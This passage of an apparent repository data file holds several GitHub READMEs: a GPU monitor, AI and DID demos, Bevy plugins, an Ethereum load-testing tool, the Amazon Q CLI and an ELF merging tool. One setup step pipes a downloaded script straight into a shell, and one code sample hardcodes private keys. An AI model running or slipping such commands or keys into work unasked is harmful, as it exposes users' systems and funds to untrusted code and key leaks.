    - [Installation Size Comparison](#installation-size-comparison)
    - [Analysis](#analysis)
  - [Features](#features)
  - [Installing and Using the Tool](#installing-and-using-the-tool)
    - [Option 1: Download Pre-built Binary](#option-1-download-pre-built-binary)
    - [Option 2: Install via Cargo](#option-2-install-via-cargo)
    - [Option 3: Build from Source](#option-3-build-from-source)
  - [Usage](#usage)
  - [Key Bindings](#key-bindings)
  - [View Modes](#view-modes)
    - [1. Default Mode](#1-default-mode)
    - [2. Bar Mode](#2-bar-mode)
    - [3. Tabbed Mode: GPU graphs in tabs for multi GPU nodes](#3-tabbed-mode-gpu-graphs-in-tabs-for-multi-gpu-nodes)
  - [Star History](#star-history)
  - [License](#license)
  - [Contributing](#contributing)
  - [Acknowledgments](#acknowledgments)


# NviWatch

NviWatch is an interactive terminal user interface (TUI) application for monitoring NVIDIA GPU devices and processes. Built with Rust, it provides real-time insights into GPU performance metrics, including temperature, utilization, memory usage, and power consumption.

## Demo

https://github.com/user-attachments/assets/176565fe-4467-4129-b783-071543c52bf4

## Benchmarks

We conducted performance benchmarks comparing nviwatch with other popular GPU monitoring tools: nvtop, nvitop, and gpustat. The results demonstrate nviwatch's efficiency in terms of CPU and memory usage. All tools except nvitop were run at 100ms interval. nvitop was set to 250ms because that is the minimum allowed value. The benchmark scripts and logs are available in the benchmarks folder. The test system had 32 GB RAM.

![nvitop error for 100ms input](benchmarks/nvitop_error.png)

### Benchmark Results

| Tool     | CPU Usage (%) |  Memory Usage (%) | Memory Usage (MB) |
|----------|---------------|-------------------|-------------------|
|          | Mean / Max    |   Mean / Max      |   Mean / Max      |
| nviwatch | 0.28 / 10.0   | 0.12 / 0.12       | 18.26 / 18.26     |
| nvtop    | 0.25 / 20.0   | 0.13 / 0.13       | 20.46 / 20.46     |
| nvitop   | 0.88 / 10.0   | 0.26 / 0.26       | 41.07 / 41.07     |
| gpustat  | 3.47 / 49.9   | 0.21 / 0.21       | 33.82 / 33.82     |

![Benchmarks comparison](benchmarks/process_usage_comparison.png)

### Installation Size Comparison

We used [python-package-size](https://github.com/qertoip/python-package-size) for determining the pip package sizes. For nvtop We used this `apt show nvtop | grep Installed-Size`.

| Tool     | Package Size |
|----------|--------------|
| nviwatch | 1.98 MB      |
| nvitop   | 4.1 MB       |
| gpustat  | 3.7 MB       |
| nvtop    | 106 KB       |

### Analysis

- **CPU Usage**: nviwatch demonstrates excellent CPU efficiency, with an average usage of just 0.28% and a maximum of 10%. It outperforms gpustat and nvitop and is comparable to nvtop in terms of average CPU usage. Important to note that nvtop supports more GPUs than just Nvidia so nviwatch isn't a complete alternative for nvwatch.

- **Memory Usage**: nviwatch shows the lowest memory footprint among all tested tools, using only 0.12% of system memory on average, which translates to about 18.26 MB. This is notably less than nvitop (41.07 MB) and gpustat (33.82 MB), and slightly better than nvtop (20.46 MB).

- **Consistency**: nviwatch maintains consistent memory usage throughout its operation, as indicated by the identical mean and max values for memory usage.

- **Package Size**: At 1.98 MB, nviwatch offers a balanced package size. It's significantly smaller than nvitop (4.1 MB) and gpustat (3.7 MB), while being significantly larger than nvtop (106 KB).

## Features

- **Real-Time Monitoring**: View real-time data on GPU temperature, utilization, memory usage, and power consumption.
- **Process Management**: Monitor processes running on the GPU and terminate them directly from the interface.
- **Graphical Display**: Visualize GPU performance metrics using bar charts and tabbed graphs.
- **Customizable Refresh Rate**: Set the refresh interval for updating GPU metrics.

## Installing and Using the Tool

### Option 1: Download Pre-built Binary

1. Go to the project's GitHub repository.
2. Navigate to the ""Releases"" section.
3. Download the latest binary release for linux.
4. Once downloaded, open a terminal and navigate to the directory containing the downloaded binary.
5. Make the binary executable with the following command:
   ```
   chmod +x nviwatch
   ```

6. You can now run the tool using:

   ```
   ./nviwatch
   ```

### Option 2: Install via Cargo

If you have Rust and Cargo installed on your system, you can easily install NviWatch directly from crates.io:

1. Open a terminal and run the following command:
   ```bash
   cargo install nviwatch
   ```

2. Once the installation is complete, you can run NviWatch from anywhere in your terminal:
   ```bash
   nviwatch
   ```

Note: Ensure you have the NVIDIA Management Library (NVML) available on your system before running NviWatch.

### Option 3: Build from Source

To build and run NviWatch, ensure you have Rust and Cargo installed on your system. You will also need the NVIDIA Management Library (NVML) available.

1. Clone the repository:
   ```bash
   git clone https://github.com/msminhas93/nviwatch.git
   cd nviwatch
   ```

2. Build the project:
   ```bash
   cargo build --release
   ```

3. Run the application:
   ```bash
   chmod +x ./target/release/nviwatch
   ./target/release/nviwatch
   ```

## Usage

NviWatch provides a command-line interface with several options:

- `-w, --watch <MILLISECONDS>`: Set the refresh interval in milliseconds. Default is 100 ms.
- `-t, --tabbed-graphs`: Display GPU graphs in a tabbed view.
- `-b, --bar-chart`: Display GPU graphs as bar charts.

Example:
```bash
./nviwatch --watch 500 --tabbed-graphs
```

## Key Bindings

- **q**: Quit the application
- **‚Üë/‚Üì**: Navigate through the list of processes
- **‚Üê/‚Üí**: Switch between GPU tabs (when using tabbed graphs)
- **x**: Terminate the selected process
- **d**: Switch to default view mode
- **t**: Switch to tabbed graphs view mode
- **b**: Switch to bar charts view mode

## View Modes

The application supports three different view modes:
### 1. Default Mode 
Shows all GPU information in a single view
![](assets/default_mode.png)

### 2. Bar Mode
Presents GPU information using bar charts
![](assets/bar_mode.png)

### 3. Tabbed Mode: GPU graphs in tabs for multi GPU nodes
Displays GPU graphs in a tabbed interface
![](assets/tabbed_mode.png)

You can switch between these modes at any time using the corresponding key bindings.

## Star History

[![Star History Chart](https://api.star-history.com/svg?repos=msminhas93/nviwatch&type=Date)](https://star-history.com/#msminhas93/nviwatch&Date)

## License

This project is licensed under the GNU General Public License v3.0. See the [LICENSE](LICENSE) file for details.

## Contributing

Contributions are welcome! Please open an issue or submit a pull request for any improvements or bug fixes.

## Acknowledgments

- Built with [Rust](https://www.rust-lang.org/) and [Ratatui](https://github.com/ratatui/ratatui).
- Utilizes the [NVIDIA Management Library (NVML)](https://developer.nvidia.com/nvidia-management-library-nvml) via the [nvml_wrapper crate](https://docs.rs/nvml-wrapper/latest/nvml_wrapper/).
",2,1,1,GPL-3.0,build.yml,2.0
marcushellberg/spring-ai-examples,main,"# Practical AI examples using Spring AI

## Included examples

- Document summarization and analysis
- Sentiment analysis
- Text drafting
- Image data extraction
- Advanced RAG techniques
  - Multi-source retrieval
  - Re-ranking
  - Question rewriting

## Requirements

The application expects you to have the following two API keys as environment variables:
- `OPENAI_API_KEY`: OpenAI API key
- `COHERE_API_KEY`: Cohere API key for document re-ranking. See `RagChat.java` comments for more information.

## Running the examples

Run `Application.java` in your IDE or use the following command:

```bash
mvn spring-boot:run
```

## Using local models

You can use local models with Ollama by updating the spring-ai dependency in the `pom.xml` file, and defining which models to use in the `application.properties` file.

",0,0,1,MIT,,0.0
OmniOneID/did-demo-server,develop,"Demo Server
==

Welcome to the Demo Server Repository. <br>
This repository contains the source code, documentation, and related resources for the Demo Server.

# OpenDID Demonstration Videos

The OpenDID demonstration videos include the following four key scenarios:

## 1. User Registration
https://github.com/user-attachments/assets/2a8e99e6-34b0-4f75-8378-a561b71d2e34
- [UserRegistration_demo_sample(video)](videos/OpenDID_Demo_UserRegistration.mov)
- **Description**: A scenario where the user directly issues a National ID VC using the app.

## 2. VC Issuance (App - National ID)
https://github.com/user-attachments/assets/e9730f2b-e02a-4478-aa72-d972f16b316c
- [VC Issuance_App_demo_sample(video)](videos/OpenDID_Demo_VCIssuance_App.mov)
- **Description**: A scenario where the user directly issues a National ID VC using the app.

## 3. VC Issuance (Demo - Mobile Driver License)
https://github.com/user-attachments/assets/d648d63e-419c-4eb4-92cc-36c13a935278
- [ VC Issuance_Web_demo_sample(video)](videos/OpenDID_Demo_VCIssuance_Demo.mov)
- **Description**: Demonstrates the scenario where the user receives a Mobile Driver License VC issuance request from the Demo site.

## 4. VP Submission
https://github.com/user-attachments/assets/2bca0ec8-ce31-491f-a427-28062e50db50
- [VP Submission_demo_sample(video)](videos/OpenDID_Demo_VPSubmission.mov)
- **Description**: A scenario where the user submits a Verifiable Presentation (VP) through the app after receiving a VP submission request from the Demo site.

## Folder Structure
Overview of the major folders and documents in the project directory:

```
did-demo-server
‚îú‚îÄ‚îÄ CHANGELOG.md
‚îú‚îÄ‚îÄ CLA.md
‚îú‚îÄ‚îÄ CODE_OF_CONDUCT.md
‚îú‚îÄ‚îÄ CONTRIBUTING.md
‚îú‚îÄ‚îÄ LICENSE
‚îú‚îÄ‚îÄ dependencies-license.md
‚îú‚îÄ‚îÄ MAINTAINERS.md
‚îú‚îÄ‚îÄ README.md
‚îú‚îÄ‚îÄ RELEASE-PROCESS.md
‚îú‚îÄ‚îÄ SECURITY.md
‚îú‚îÄ‚îÄ docs
‚îÇ¬†¬† ‚îî‚îÄ‚îÄ installation
‚îÇ¬†¬†     ‚îî‚îÄ‚îÄ OpenDID_DemoServer_InstallationAndOperation_Guide.md
‚îÇ¬†¬†     ‚îî‚îÄ‚îÄ OpenDID_DemoServer_InstallationAndOperation_Guide_ko.md
‚îî‚îÄ‚îÄ source
    ‚îî‚îÄ‚îÄ demo
        ‚îú‚îÄ‚îÄ gradle
        ‚îú‚îÄ‚îÄ libs
            ‚îî‚îÄ‚îÄ did-crypto-sdk-server-1.0.0.jar
        ‚îî‚îÄ‚îÄ src
        ‚îî‚îÄ‚îÄ build.gradle
        ‚îî‚îÄ‚îÄ README.md
‚îî‚îÄ‚îÄ videos
```

<br/>

Below is a description of each folder and file in the directory:

| Name                    | Description                                         |
| ----------------------- | --------------------------------------------------- |
| CHANGELOG.md            | Version changes of the project                      |
| CODE_OF_CONDUCT.md      | Code of conduct for contributors                    |
| CONTRIBUTING.md         | Contribution guidelines and procedures              |
| LICENSE                 | License                                             |
| dependencies-license.md | License information for project dependencies        |
| MAINTAINERS.md          | Guidelines for project maintainers                  |
| RELEASE-PROCESS.md      | Procedure for releasing new versions                |
| SECURITY.md             | Security policy and vulnerability reporting method  |
| docs                    | Documentation                                       |
| ‚îñ installation          | Installation and setup guide                        |
| source                  | Source code                                         |
| ‚îñ did-demo-server       | DEMO server source code and build files             |
| &nbsp;&nbsp;&nbsp;‚îñ gradle                | Gradle build settings and scripts                   |
| &nbsp;&nbsp;&nbsp;‚îñ libs                  | External libraries and dependencies                 |
| &nbsp;&nbsp;&nbsp;‚îñ sample                | Sample files                                        |
| &nbsp;&nbsp;&nbsp;‚îñ src                   | Main source code directory                          |
| &nbsp;&nbsp;&nbsp;‚îñ build.gradle          | Gradle build configuration file                     |
| &nbsp;&nbsp;&nbsp;‚îñ README.md             | Source code overview and guide                      |
| videos                  | Demonstration videos                                |

<br/>


## Libraries

Libraries used in this project are organized into two main categories:

1. **Open DID Libraries**: These libraries are developed by the Open DID project and are available in the [libs folder](source/did-demo-server/libs). They include:

   - `did-crypto-sdk-server-1.0.0.jar`

2. **Third-Party Libraries**: These libraries are open-source dependencies managed via the [build.gradle](source/did-demo-server/build.gradle) file. For a detailed list of third-party libraries and their licenses, please refer to the [dependencies-license.md](dependencies-license.md) file.

## Installation And Operation Guide

For detailed instructions on installing and configuring the Demo Server, please refer to the guide below:
- [OpenDID Demo Server Installation and Operation Guide](docs/installation/OpenDID_DemoServer_InstallationAndOperation_Guide.md)  

## Change Log

The Change Log provides a detailed record of version-specific changes and updates. You can find it here:
- [Change Log](./CHANGELOG.md)  

## Contributing

Please read [CONTRIBUTING.md](CONTRIBUTING.md) and [CODE_OF_CONDUCT.md](CODE_OF_CONDUCT.md) for details on our code of conduct, and the process for submitting pull requests to us.

## License
[Apache 2.0](LICENSE)
",1,0,2,Apache-2.0,"auto-assign.yml,build.yml,ci.yml",14.0
matthunz/voxy,main,"# Voxy

[![License](https://img.shields.io/badge/license-MIT%2FApache-blue.svg)](https://github.com/matthunz/voxy)
[![Crates.io](https://img.shields.io/crates/v/voxy.svg)](https://crates.io/crates/voxy)
[![Downloads](https://img.shields.io/crates/d/voxy.svg)](https://crates.io/crates/voxy)
[![Docs](https://docs.rs/voxy/badge.svg)](https://docs.rs/voxy/latest/voxy/)
[![CI](https://github.com/matthunz/voxy/workflows/CI/badge.svg)](https://github.com/matthunz/voxy/actions)

A voxel engine for [Bevy](https://github.com/bevyengine/bevy).

Features:
 - Uses the [block_mesh](https://docs.rs/block-mesh/latest/block_mesh/) crate for high-performance chunk meshing
   - Chunks are meshed and lit in parallel using async tasks
 - Uses the [dot_vox](https://github.com/dust-engine/dot_vox) crate to load [MagicaVoxel](https://ephtracy.github.io/) `.vox` files
   - Load multiple models into a `Scene`
   - Hot-reload of scene files
   - Emissive textures and lighting

```rs
use bevy::{core_pipeline::bloom::BloomSettings, prelude::*};
use voxy::prelude::*;

fn main() {
    App::new()
        .add_plugins((DefaultPlugins, voxy::DefaultPlugins))
        .add_systems(Startup, setup)
        .add_systems(Update, rotate)
        .run();
}

fn setup(mut commands: Commands, asset_server: Res<AssetServer>) {
    // Spawn a scene with multiple models from a `.vox` file.
    commands.spawn((
        asset_server.load::<VoxelScene>(""character.vox""),
        SpatialBundle::default(),
    ));

    // Setup default lighting.
    commands.insert_resource(AmbientLight {
        brightness: 500.,
        ..default()
    });

    // Setup the camera.
    commands.spawn((
        Camera3dBundle {
            camera: Camera {
                hdr: true,
                ..default()
            },
            transform: Transform::from_translation(Vec3::new(-60., 60., -60.))
                .looking_at(Vec3::ZERO, Vec3::Y),
            ..Default::default()
        },
        BloomSettings::NATURAL,
    ));
}

// Rotate the right arm of our character.
fn rotate(models_query: Query<&VoxelSceneModels>, mut transform_query: Query<&mut Transform>) {
    for models in &models_query {
        if let Some(entity) = models.entities.get(""right_arm"") {
            let mut transform = transform_query.get_mut(*entity).unwrap();

            transform.rotate_around(Vec3::new(0., 24., 4.), Quat::from_rotation_x(0.01));
        }
    }
}
```
",2,0,2,Apache-2.0,ci.yml,1.0
Hexorg/bevy_copperfield,main,"`bevy_copperfield` is a [Bevy](https://github.com/bevyengine/bevy) plugin for procedural modelling, inspired by [Blender's geometry nodes](https://docs.blender.org/manual/en/latest/modeling/geometry_nodes/index.html). Currently at its infancy, but `bevy_coperfield` allows you to create and edit meshes in non-destructive manner. 

Example box from Cuboid:
![Example extruded and chamfered Cuboid](https://github.com/Hexorg/bevy_copperfield/blob/main/extrude_bevel_debug.png)

# UV Unwrap

`bevy_copperfield` now supports 3 methods for automatic UV-unwrapping - Cube mapping, Sphere mapping, and [Least Squares Conformal Mapping](https://en.wikipedia.org/wiki/Least_squares_conformal_map)

![Cube Mapped complex shape](https://github.com/Hexorg/bevy_copperfield/blob/main/cube_mapping.png)

![Face outline visible on UV unwrap](https://github.com/Hexorg/bevy_copperfield/blob/main/cube_uv.png)

# Approach

`bevy_copperfield` implements a [Half-Edge Mesh data-structure](https://www.flipcode.com/archives/The_Half-Edge_Data_Structure.shtml) which allows us to quickly navigate and edit the mesh, providing methods to extrude, subdivide, and bevel parts of the mesh. The debug eample provides a nice visualization of the internal data-structure implemented, as each drawn edge is a pointer to the next one.

![Simple half-edge mesh](https://github.com/Hexorg/bevy_copperfield/blob/main/sample_mesh.png)

# Usage
`bevy_copperfield` is still is its early stages of development, but its key goals is to enable seamless use in Bevy. Upon adding `bevy_copperfield` to your repository, supported Bevy 3D primitives (currently just `Cuboid`) will allow you to spawn editable mesh with `.procgen()`. From there you will be able to chain series of edit nodes to turn primitives into objects you want. See [examples](https://github.com/hexorg/bevy_copperfield/tree/latest/examples) for sample use.",0,2,2,MIT,"build.yml,lint.yml,test.yml",1.0
flashbots/contender,main,"# Contender

![Build & Test Status](https://github.com/flashbots/contender/actions/workflows/rust.yml/badge.svg)

Contender is a high-performance Ethereum network spammer and testing tool designed for benchmarking and stress-testing Ethereum clients and networks.

## Features

- **Flexible Transaction Generation**: Create custom transaction patterns using TOML configuration files.
- **Multiple Spamming Modes**: Support for both timed and block-wise spamming.
- **Seed-based Randomization**: Reproducible fuzzing with customizable seed values.
- **Database Integration**: SQLite backend to store contract/transaction data and analyze test results.
- **Extensible Architecture**: Easy-to-implement custom generators and callbacks.

## Installation

To install the Contender CLI, you need to have the [Rust toolchain](https://rustup.rs/) and [libsqlite3-dev](https://packages.debian.org/sid/libsqlite3-dev) installed on your system. Then install from github:

```bash
cargo install --git https://github.com/flashbots/contender --bin contender
```

## Usage

Contender can be used as both a library and a command-line tool.

### Command-line Interface

```bash
contender setup <testfile> <rpc_url> [OPTIONS]
contender spam <testfile> <rpc_url> [OPTIONS]
contender report [OPTIONS]
```

For detailed usage instructions, run:

```bash
contender --help
```

### Library Usage

To use Contender as a library in your Rust project, add the crates you need to your `Cargo.toml`:

```toml
[dependencies]
...
contender_core = { git = ""https://github.com/flashbots/contender"" }
contender_sqlite = { git = ""https://github.com/flashbots/contender"" }
contender_testfile = { git = ""https://github.com/flashbots/contender"" }
# not necessarily required, but recommended:
tokio = { version = ""1.40.0"", features = [""rt-multi-thread""] }
```

```rust
use contender_core::{
    db::DbOps,
    generator::RandSeed,
    spammer::{BlockwiseSpammer, TimedSpammer, NilCallback, LogCallback},
    test_scenario::TestScenario,
};
use contender_sqlite::SqliteDb;
use contender_testfile::TestConfig;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let db = &SqliteDb::new_memory();
    db.create_tables()?;
    let cfg = TestConfig::from_file(""testfile.toml"")?;
    let mut agents = AgentStore::new();
    let rand_seed = RandSeed::new();
    agents.add_random_agent(
        ""agentName"",
        4, // number of random signers to create
        rand_seed
    )
    let scenario = TestScenario::new(
        cfg,
        db.to_owned().into(),
        ""http://localhost:8545"".parse::<_>()?,
        None,
        rand_seed,
        &[
            ""0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80"",
            ""0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d"",
            ""0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a"",
        ]
        .iter()
        .map(|s| s.parse::<_>().unwrap())
        .collect::<Vec<_>>(),
        agents
    );

    if db.get_named_tx(""MyContract"").is_err() {
        scenario.deploy_contracts().await?;
        scenario.run_setup().await?;
    }

    let spammer = TimedSpammer::new(std::time::Duration::from_secs(1));
    // or
    // let spammer = BlockwiseSpammer {};

    // callback is triggered when tx/bundle request is sent
    // NilCallback does nothing, LogCallback writes tx data to DB
    let tx_callback = LogCallback::new(scenario.rpc_client().clone());
    // or
    // let tx_callback = NilCallback;

    // placeholder; this should identify the run in the DB
    let run_id = 1_u64;
    
    // send 20 requests per second, over 10 seconds
    spammer.spam_rpc(&mut scenario, 20, 10, Some(run_id), tx_callback.into()).await?;

    Ok(())
}
```

## Configuration

Contender uses TOML files for test configuration. Single brackets `[]` indicate the item may only be specified once. Double brackets `[[]]` indicate an array, which allows the directive to be specified multiple times.

The key directives are:

- `[env]`: Defines environment variables that can be used throughout the configuration.

- `[[create]]`: Specifies contracts to be deployed. Each entry represents a contract creation.

- `[[setup]]`: Defines setup transactions to be executed before the main spam test. These are typically used for initializing contracts or setting up test conditions.

- `[[spam]]`: Describes the transactions to be repeatedly sent during the spam test. These form the core of the network stress test.

  - Spam directives can send bundles or single txs. 

  - `[[spam.bundle.tx]]` defines transactions in a bundle

  - `[spam.tx]` defines a single transaction

  - Each tx directive can include various fields such as `to`, `from`, `signature`, `args`, and `value` to specify the details of the transactions or contract interactions.

  - `[[spam.bundle.tx.fuzz]]` or `[[spam.tx.fuzz]]`: Configures fuzzing parameters for specific fields in spam transactions, allowing for randomized inputs or ETH values within defined ranges.

See [scenarios/](./scenarios/) for examples.

## Architecture

Contender is built with a modular architecture:

- **Generators**: Produce transaction requests based on configuration.
- **Spammers**: Send transactions to the network at specified rates.
- **Callbacks**: Handle post-transaction actions and logging.
- **Database**: Store and retrieve test results and contract addresses.

```mermaid
graph TD
    A[TOML Config File] -->|Parsed by| B[TestConfig]
    B -->|Configures| C[Generator]
    C -->|Produces| D[Transaction Requests]
    D -->|Fed to| E[Spammer]
    E -->|Sends txs| F[Ethereum Network]
    F -->|Responses| G[Callback Handler]
    G -->|Logs results| H[Database]
    
    I[CLI] -->|Reads| A
    I -->|Controls| E
    I -->|Queries| H
    
    H -->|Data for| J[Report Generator]

    %% Component descriptions
    A:::config
    B:::config
    C:::core
    D:::core
    E:::core
    F:::external
    G:::core
    H:::storage
    I:::interface
    J:::analysis

    classDef config fill:#f9f,stroke:#333,stroke-width:2px;
    classDef core fill:#bbf,stroke:#333,stroke-width:2px;
    classDef external fill:#bfb,stroke:#333,stroke-width:2px;
    classDef storage fill:#fbb,stroke:#333,stroke-width:2px;
    classDef interface fill:#bff,stroke:#333,stroke-width:2px;
    classDef analysis fill:#ffb,stroke:#333,stroke-width:2px;
```

## Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## Acknowledgements

- The Ethereum community for their continuous innovation.
- The Reth project for inspiration on project structure and documentation.
- [alloy-rs](https://github.com/alloy-rs) -- the backbone of this project.
",0,5,7,MIT,"lint.yml,rust.yml",47.0
aws/amazon-q-developer-cli,main,"# Amazon Q Developer for command line Monorepo

The **`amazon-q-developer-cli`** monorepo houses most of the core code for the Amazon Q Developer desktop
app and CLI.

## Installation

To install Amazon Q Developer for command line see the AWS public documentation [here](https://docs.aws.amazon.com/amazonq/latest/qdeveloper-ug/command-line-installing.html).

## Overview

Several projects live here:

- [`autocomplete`](packages/autocomplete/) - The autocomplete react app
- [`dashboard`](packages/dashboard/) - The dashboard react app
- [`figterm`](crates/figterm/) - figterm, our headless terminal/pseudoterminal that
  intercepts the user‚Äôs terminal edit buffer.
- [`q_cli`](crates/q_cli/) - the `q` CLI, allows users to interface with Amazon Q Developer from
  the command line
- [`fig_desktop`](crates/fig_desktop/) - the Rust desktop app, uses
  [`tao`](https://docs.rs/tao/latest/tao/)/[`wry`](https://docs.rs/wry/latest/wry/)
  for windowing/webviews
- [`fig_input_method`](crates/fig_input_method/) - The input method used to get cursor
  position on macOS
- [`vscode`](extensions/vscode/) - Contains the VSCode plugin needed
  for the Amazon Q Developer for command line to work in VSCode
- [`jetbrains`](extensions/jetbrains/) - Contains the VSCode plugin
  needed for the Amazon Q Developer for command line to work in Jetbrains IDEs

Other folder to be aware of

- [`build-scripts/`](build-scripts/) - Contains all python scripts to build,
  sign, and test the project on macOS and Linux
- [`crates/`](crates/) - Contains all internal rust crates
- [`packages/`](packages/) - Contains all internal npm packages
- [`proto/`](proto/) -
  [protocol buffer](https://developers.google.com/protocol-buffers/) message
  specification for inter-process communication
- [`tests/`](tests/) - Contain integration tests for the projects

Below is a high level architecture of how the different components of the app and
their IPC:

![architecture](docs/assets/architecture.svg)

## Setup

### Prerequisites

- MacOS
  - Xcode 13 or later
  - Brew

### 1. Clone repo

```bash
git clone https://github.com/aws/amazon-q-for-command-line.git
```

### 2. Install platform dependencies

This is all the dep

For Debian/Ubuntu:

```bash
sudo apt update
sudo apt install build-essential pkg-config jq dpkg curl wget cmake clang libssl-dev libgtk-3-dev libayatana-appindicator3-dev librsvg2-dev libdbus-1-dev libwebkit2gtk-4.1-dev libjavascriptcoregtk-4.1-dev valac libibus-1.0-dev libglib2.0-dev sqlite3 libxdo-dev protobuf-compiler
```

For Arch:

```bash
sudo pacman -Syu
sudo pacman -S --needed webkit2gtk base-devel curl wget openssl appmenu-gtk-module gtk3 libappindicator-gtk3 librsvg libvips cmake jq pkgconf
```

For Fedora:

```bash
sudo dnf check-update
sudo dnf install webkit2gtk3-devel.x86_64 openssl-devel curl wget libappindicator-gtk3 librsvg2-devel jq
sudo dnf group install ""C Development Tools and Libraries""
```

For MacOS:

```shell
xcode-select --install
brew install rtx pnpm protobuf zsh bash fish shellcheck jq
```

### 2. Install Rust toolchain using [Rustup](https://rustup.rs):

```shell
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
rustup toolchain default stable
# for pre-commit hooks the two following commands are required
rustup toolchain install nightly
cargo install typos-cli
```

For MacOS development make sure the right targets are installed:

```bash
rustup target add x86_64-apple-darwin
rustup target add aarch64-apple-darwin
```

### 3. Setup Python and Node using [`rtx`](https://mise.jdx.dev)

Add mise integrations to your shell shell

```shell
# zsh
echo 'eval ""$(mise activate zsh)""' >> ""${ZDOTDIR-$HOME}/.zshrc""

# bash
echo 'eval ""$(mise activate bash)""' >> ~/.bashrc

# fish
echo 'mise activate fish | source' >> ~/.config/fish/config.fish
```

Install the Python and Node toolchains using:

```shell
mise install
```

### 4. Setup precommit hooks

```shell
# Run `pnpm` in root directory to add pre-commit hooks
pnpm install --ignore-scripts && pnpm husky install
```

## Security

See [CONTRIBUTING](CONTRIBUTING.md#security-issue-notifications) for more information.

## Licensing

This repo is dual licensed under MIT and Apache 2.0 licenses.

‚ÄúAmazon Web Services‚Äù and all related marks, including logos, graphic designs, and service names, are trademarks or trade dress of AWS in the U.S. and other countries. AWS‚Äôs trademarks and trade dress may not be used in connection with any product or service that is not AWS‚Äôs, in any manner that is likely to cause confusion among customers, or in any manner that disparages or discredits AWS.
",0,3,56,Apache-2.0,"mdbook.yml,rust.yml,typescript.yml,typos.yml",47.0
whitequark/superlinker,main,"# ÔΩìÔΩïÔΩêÔΩÖÔΩíÔΩåÔΩâÔΩéÔΩãÔΩÖÔΩí

Superlinker is a tool that can combine executables and shared libraries into even larger products, just like object files are combined into executables and shared libraries. It works well enough for [building a self-contained Python distribution](#python) from off-the-shelf packages.

## Why?

Wouldn't it be funny if your entire OS image consisted of only one shared object that was *really*, ***really*** large?

## How?

Superlinker is structured essentially like a compiler whose inputs and outputs are interpreted programs (ELF `ET_DYN` PIE executables or shared libraries). Its frontend lifts an ELF `ET_DYN` object into an abstract and simple intermediate representation, and its backend lowers this representation back to an ELF `ET_DYN` object. While memory mappings (`PT_LOAD` segments) are retained essentially intact, none of the ELF headers are copied from the inputs to the outputs. Of the many possible transformations, the currently implemented one rebases and merges several ELF objects. This approach is quite robust.

Additionally, Superlinker is able to merge the dynamic linker itself into an executable, which enables transforming system-dependent executables into executables that run anywhere. (The resulting executable is still an `ET_DYN` object to retain the benefits of ASLR, but it has no load-time dependencies.) This is implemented with an executable shim that emulates the kernel ABI for `PT_INTERP` loaded objects, and so is not tied to a specific libc, but currently only tested with [musl libc][].

The intermediate representation features architecture-, target-, and (somewhat) format-independent model of loadable segments, relocations, symbols, and image interpreters, biased towards ELF without directly requiring it. The frontend and backend are currently ported to `amd64` only. Although not strictly required for functioning, section headers are emitted as a courtesy for `libbfd` based tools (e.g. `objdump`).

[musl libc]: https://musl-libc.org

## Use?

First, install [Rust][] and run `cargo build`.

```
Usage: ./target/debug/superlinker <output.elf> <target.elf> [<source1.elf> [<source2.elf> ...]]
```

[rust]: https://rust-lang.org/

## Show?

```
$ make -C data # prepare test files
$ ./data/test_exec.elf
Error loading shared library libtest_dyn.so: No such file or directory (needed by ./data/test_exec.elf)
Error relocating ./data/test_exec.elf: dyn_main: symbol not found
$ readelf -d ./data/test_exec.elf

Dynamic section at offset 0x2e00 contains 25 entries:
  Tag        Type                         Name/Value
 0x0000000000000001 (NEEDED)             Shared library: [libtest_dyn.so]
 0x0000000000000001 (NEEDED)             Shared library: [libc.so]
 0x000000000000000c (INIT)               0x1000
...
$ ./target/debug/superlinker merged.elf data/test_exec.elf data/libtest_dyn.so /lib/x86_64-linux-musl/libc.so
merge_into: merging source image ""libtest_dyn.so"" into target image ""test_exec.elf""
merge_into: rebasing source image by +0x5000
merge_into: ignoring source special symbol _init
merge_into: using source global symbol dyn_main to resolve target import
merge_into: ignoring source special symbol _fini
merge_into: removing extinguished dependency ""libtest_dyn.so""
merge_into: merging source image ""libc.so"" into target image ""test_exec.elf""
merge_into: rebasing source image by +0xa000
merge_into: using source global symbol puts to resolve target import
merge_into: forcing target special symbol _init to come from libc
merge_into: forcing target special symbol _fini to come from libc
merge_into: using source global symbol __cxa_finalize to resolve target missing weak symbol
merge_into: using source global symbol __libc_start_main to resolve target import
merge_into: removing extinguished dependency ""libc.so""
merge_into: embedding the source image into target object as its interpreter
$ ./merged.elf
hello from main()!
hello from dyn_main()!
$ readelf -d ./merged.elf

Dynamic section at offset 0x2000 contains 9 entries:
  Tag        Type                         Name/Value
 0x0000000000000005 (STRTAB)             0x20a0
 0x000000000000000a (STRSZ)              15767 (bytes)
 0x000000000000000b (SYMENT)             24 (bytes)
 0x0000000000000006 (SYMTAB)             0x5e38
 0x0000000000000004 (HASH)               0xfe70
 0x0000000000000007 (RELA)               0x11940
 0x0000000000000008 (RELASZ)             2640 (bytes)
 0x0000000000000009 (RELAENT)            24 (bytes)
 0x0000000000000000 (NULL)               0x0
```

## Flaws?

Although the core approach is sound, this implementation has flaws, most of which are fixable:

- All of the code continues to use the dynamic linking ABI, i.e. procedure calls go through PLT and global accesses go through GOT. This is the only flaw inherent to the approach.
- Executable and shared object formats are notoriously complex and this implementation is bound to have bugs.
    - Moreover, some of the more obscure features are not implemented rigorously or at all (e.g. symbol scoping, visibility, and versioning).
- All GOT and PLT optimizations are disabled. (This means that `DT_JMPREL`, `DT_PLTREL`, and `DT_PLTRELSZ` entries are stripped.)
    - PLT optimizations at least could be added back with additional work.
- Only the `global-dynamic` TLS model is supported.
- Only ""Rela"" relocations are implemented and tested, though ""Rel"" relocations would be trivial to add.
- `DT_GNU_HASH` is not supported, and the number of `DT_HASH` buckets is randomly fixed at 4.
- Although ASLR is supported (Superlinker only produces position independent executables), `PT_GNU_STACK` and `PT_GNU_RELRO` are not supported and stripped.
- Exception handling currently isn't supported, and `PT_GNU_EH_FRAME` is stripped.
- Some of the internal book-keeping probably has O(n¬≤) complexity.

The implementation is less than a thousand lines long, written with portability in mind, and extensively commented, so it should not be too difficult to address most of these flaws. It should even run on Windows!

## Python?

